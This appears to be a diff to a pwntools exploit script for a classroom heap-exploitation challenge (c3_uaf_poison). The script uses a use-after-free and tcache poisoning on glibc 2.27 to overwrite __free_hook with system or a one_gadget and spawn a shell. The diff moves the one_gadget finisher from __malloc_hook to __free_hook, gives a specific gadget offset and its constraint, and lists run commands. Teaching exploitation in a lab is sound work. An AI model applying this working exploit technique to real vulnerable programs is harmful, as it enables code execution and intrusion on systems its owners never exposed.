@@ -21,15 +21,24 @@ Why UAF-Edit is "better" than double-free
 
 one_gadget alternative (documented, off by default)
 ----------------------------------------------------
-Instead of system + "/bin/sh", overwrite __free_hook (or __malloc_hook)
-with a one_gadget. Run:  one_gadget glibc-2.27/libc-2.27.so
+Instead of system + "/bin/sh", overwrite __free_hook with a one_gadget
+and trigger it by freeing any live note. Run: one_gadget libc-2.27.so
 and paste a working gadget + its constraint below. one_gadget relies on
 stack-state constraints, so the instructor MUST pre-test which gadget
-fires from the menu. system+"/bin/sh" is the reliable default.
+fires -- the trigger CALL SITE matters: the same gadget may satisfy its
+constraint when called via free() (__free_hook) but NOT via malloc()
+(__malloc_hook), because the stack frames differ. On the pinned
+2.27-3ubuntu1.6 build, 0x4f322 ([rsp+0x40]==NULL) fires from the
+__libc_free hook call site but fails from __malloc_hook's, so we target
+__free_hook and trigger via delete(). system+"/bin/sh" is the reliable
+default; one_gadget is the constrained alternative.
 
 Run
 ---
-    cd challenges && python3 c3_uaf_poison/exp.py
+    cd challenges && python3 c3_uaf_poison/exp.py            # system + /bin/sh (default)
+    cd challenges && python3 c3_uaf_poison/exp.py --one-gadget  # one_gadget via __free_hook
+    cd challenges && python3 c3_uaf_poison/exp.py --demo      # live pwndbg demo (system path)
+    cd challenges && python3 c3_uaf_poison/exp.py --demo --one-gadget
 """
 
 from pwn import *
@@ -84,11 +93,14 @@ def show(idx: int) -> bytes:
     p.recvuntil(b"data=")
     return p.recvuntil(b"\n", drop=True)
 
-# ---- toggle: True = try one_gadget, False = reliable system+"/bin/sh" ------
-USE_ONE_GADGET = False
-# Pre-tested on 2.27-3ubuntu1.6 from the menu context. Replace if your
-# pinned libc differs (run `one_gadget libc-2.27.so` and pick a passing one).
-ONE_GADGET = 0x4f322   # constraint: [rsp+0x40] == NULL
+# ---- finisher toggle: --one-gadget = one_gadget via __free_hook, default = system+"/bin/sh" ----
+USE_ONE_GADGET = "--one-gadget" in sys.argv
+# Pre-tested on 2.27-3ubuntu1.6: 0x4f322 fires from the __libc_free hook
+# call site (delete -> free -> __free_hook), NOT from __malloc_hook's call
+# site (the malloc path's stack frame fails the [rsp+0x40]==NULL constraint,
+# so execve fails and the proc _exit(127)s -- appears to "hang"). Replace
+# if your pinned libc differs (run `one_gadget libc-2.27.so` and re-test).
+ONE_GADGET = 0x4f322   # constraint: [rsp+0x40] == NULL  (trigger via free)
 
 # ===========================================================================
 # STAGE 1 - leak libc base (same as C2)
@@ -116,27 +128,20 @@ delete(3)        # head=3, counts=1
 delete(2)        # head=2 -> 3, counts=2  (two DIFFERENT chunks: no double-free)
 demo_hint("run: tcache | 0x70 bin 2->3, counts=2 (NO self-loop -- contrast C1)")
 # UAF-Edit the HEAD (note 2): its data overlaps the freed chunk's fd.
-if USE_ONE_GADGET:
-    target = free_hook if False else libc.symbols["__malloc_hook"]
-    payload_val = libc.address + ONE_GADGET
-    edit(2, 8, p64(payload_val))
-    log.info("poisoned fd -> __malloc_hook = one_gadget %#x", payload_val)
-    demo_hint("run: tcache | head's fd -> __malloc_hook (one_gadget)")
-else:
-    edit(2, 8, p64(free_hook))
-    log.info("poisoned fd -> __free_hook")
-    demo_hint("run: tcache | head's fd -> __free_hook")
+# Both finishers land on __free_hook (gadget fires from the free() call
+# site, not malloc's -- see the one_gadget note above).
+edit(2, 8, p64(free_hook))
+log.info("poisoned fd -> __free_hook")
+demo_hint("run: tcache | head's fd -> __free_hook")
 
 add(4, SZ, b"PAD")                       # malloc #1: returns chunk-2
 if USE_ONE_GADGET:
-    add(5, SZ, p64(libc.address + ONE_GADGET))  # malloc #2: returns __malloc_hook
-    log.success("__malloc_hook = one_gadget")
-    demo_hint("run: p &__malloc_hook | value == one_gadget; continue in gdb to trigger malloc")
-    # trigger via malloc: any Add calls malloc -> hook fires -> one_gadget
-    p.sendlineafter(b"> ", b"1")
-    p.sendlineafter(b"idx: ", b"8")
-    p.sendlineafter(b"size: ", b"0x18")
-    # one_gadget fires inside malloc, before it asks for data
+    add(5, SZ, p64(libc.address + ONE_GADGET))  # malloc #2: returns __free_hook
+    log.success("__free_hook = one_gadget %#x", libc.address + ONE_GADGET)
+    demo_hint("run: p &__free_hook | value == one_gadget; continue in gdb to trigger free")
+    add(6, SZ, b"PADDING")               # chunk to free (data irrelevant; gadget sets /bin/sh)
+    delete(6)                             # free -> __free_hook -> one_gadget -> shell
+    log.success("shell popped (one_gadget)")
 else:
     add(5, SZ, p64(system))              # malloc #2: returns __free_hook
     log.success("__free_hook = system")
